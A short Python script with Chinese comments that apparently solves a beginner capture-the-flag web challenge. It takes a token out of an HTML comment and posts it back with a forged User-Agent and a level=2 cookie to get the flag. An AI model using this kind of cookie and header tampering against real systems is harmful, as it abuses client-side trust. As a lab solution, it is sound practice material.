import requests
import re

BASE = "http://ctflab.iytzx.com/Mini_Challenge.php"

def exploit():
    s = requests.Session()           # 全程同一个会话

    # ===== 第1步：GET 拿 token =====
    try:
        r1 = s.get(BASE, params={"step": "1"}, timeout=5)
    except requests.exceptions.RequestException as e:
        print("第1步请求失败：", e)
        return

    # 用正则从 HTML 注释里提取 token：<!-- token: xxx -->
    m = re.search(r"token: ([a-z0-9_]+)", r1.text)
    if not m:
        print("没提取到token，页面内容：", r1.text)
        return
    token = m.group(1)
    print("提取到 token：", token)

    # ===== 第2步：POST 提交，带请求头和Cookie =====
    headers = {"User-Agent": "CTF-Agent"}        # User-Agent 要是 CTF-Agent
    cookies = {"level": "2"}        # level=2
    data = {"token": token}           # token=提取到的token
    r2 = s.post(BASE, params={"step": "2"}, data=data,
                headers=headers, cookies=cookies, timeout=5)

    # ===== 从结果里提取 flag =====
    flag = re.findall(r"flag{.+?}", r2.text)
    if flag:
        print("🎉 拿到：", flag)
        # 把flag写入文件保存
        with open("result_flag.txt", "w", encoding="utf-8") as f:
            f.write(flag[0])
    else:
        print("未拿到flag，页面返回：\n", r2.text)

exploit()
